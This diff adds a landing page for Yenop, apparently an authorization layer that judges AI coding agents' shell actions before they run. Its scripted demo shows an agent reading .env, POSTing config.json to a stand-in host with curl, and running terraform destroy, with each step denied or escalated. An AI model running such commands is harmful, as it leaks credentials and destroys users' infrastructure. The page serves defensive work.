@@ -1,0 +1,93 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Yenop — Agents decide what to do. Yenop decides what is allowed to happen.</title>
+<meta name="description" content="A local-first execution authorization layer for AI coding agents. One set of rules across Claude Code, Cursor, Codex, Gemini and MCP. Your commands, prompts and source stay on your machine.">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='6' fill='%230b0f14'/%3E%3Cpath d='M9 8l7 9 7-9M16 17v7' stroke='%23e6edf3' stroke-width='3' fill='none' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E">
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+<a class="preview" href="https://github.com/yenopdev/yenop#readme">Pre-alpha · Developer Preview</a>
+
+<header class="hero">
+  <div class="wordmark">YENOP</div>
+  <h1>Agents decide what to do.<br>Yenop decides what is allowed to happen.</h1>
+  <p class="lede">See what your AI coding agent is actually allowed to do.</p>
+  <p class="cta">
+    <a class="btn primary" href="#demo">Watch demo</a>
+    <a class="btn" href="https://github.com/yenopdev/yenop">GitHub</a>
+  </p>
+</header>
+
+<section>
+  <h2>AI agents have real access to your machine.</h2>
+  <p>A coding agent runs shell commands, edits files, calls tool servers and reaches the network on your behalf. Its own permission prompt is the model asking itself. Yenop puts an independent authorization layer between the agent and execution: every action is parsed, judged against policy, and answered before it runs.</p>
+  <div class="verdicts">
+    <div class="verdict allow"><b>ALLOW</b><span>the boring majority, silently</span></div>
+    <div class="verdict ask"><b>ASK</b><span>a person sees it first, with the run's history</span></div>
+    <div class="verdict deny"><b>DENY</b><span>never reaches the tool</span></div>
+  </div>
+</section>
+
+<section id="demo">
+  <h2>Ninety seconds</h2>
+  <div class="term" aria-label="Demo transcript">
+<pre><span class="agent">agent</span>  I found the .env file. I'll read it to get the database URL.
+<span class="cmd">$ cat .env</span>
+<span class="deny">DENY</span>   no-secret-files: a credential path
+
+<span class="agent">agent</span>  I'll send the configuration to the debugging service.
+<span class="cmd">$ curl -X POST https://collect.example -d @config.json</span>
+<span class="deny">DENY</span>   external-network-after-sensitive-data: this run has touched sensitive data
+
+<span class="agent">agent</span>  I'll run terraform destroy to clean up the old environment.
+<span class="cmd">$ terraform destroy -auto-approve</span>
+<span class="ask">ASK</span>    destructive-shell
+       run history: read untrusted content (issue #142), then read infra/prod.tfvars
+<span class="you">you</span>    allow
+
+<span class="cmd">$ yenop report</span>
+Runs          1     Actions        23
+ALLOW        17     ASK            4     DENY   2
+Denies by rule
+  no-secret-files                          1
+  external-network-after-sensitive-data    1</pre>
+  </div>
+  <p class="small">A scripted version of this runs on your machine in thirty seconds: <code>yenop demo</code>. Nothing in it is real.</p>
+</section>
+
+<section>
+  <h2>Works with</h2>
+  <ul class="runtimes">
+    <li>Claude Code</li>
+    <li>Cursor</li>
+    <li>Codex CLI</li>
+    <li>Gemini CLI</li>
+    <li>Any MCP client</li>
+  </ul>
+  <p>One engine, one policy language, one receipts log. A rule written once applies to every agent you run, and the boundary does not move when the model, the runtime or the tool server changes.</p>
+</section>
+
+<section>
+  <h2>Get started</h2>
+<pre class="install"><code>npm install -g yenop
+cd your-project
+yenop init          # hooks the agents it finds
+yenop demo          # a scripted attack, judged live
+yenop viewer --open # watch the receipts</code></pre>
+  <p>Start in <b>observe mode</b>: nothing is blocked, everything is recorded. Run it for a week, then read <code>yenop report</code> and see what would have been stopped.</p>
+  <p class="cta"><a class="btn primary" href="https://github.com/yenopdev/yenop#quickstart">Quickstart</a> <a class="btn" href="security/">Threat model</a></p>
+</section>
+
+<section class="local">
+  <h2>Local-first. No cloud required.</h2>
+  <p>Decisions are made on your machine, in under a millisecond, by a deterministic engine. Your commands, prompts and source stay local. Telemetry is off by default; when you turn it on it sends counts, never content, and <code>yenop telemetry status</code> prints exactly what would leave.</p>
+</section>
+
+<footer>
+  <p>Pre-alpha · Developer Preview. Source-available under FSL-1.1-ALv2. <a href="https://github.com/yenopdev/yenop">GitHub</a> · <a href="https://github.com/yenopdev/yenop/discussions">Discussions</a> · <a href="security/">Security</a></p>
+</footer>
+</body>
+</html>
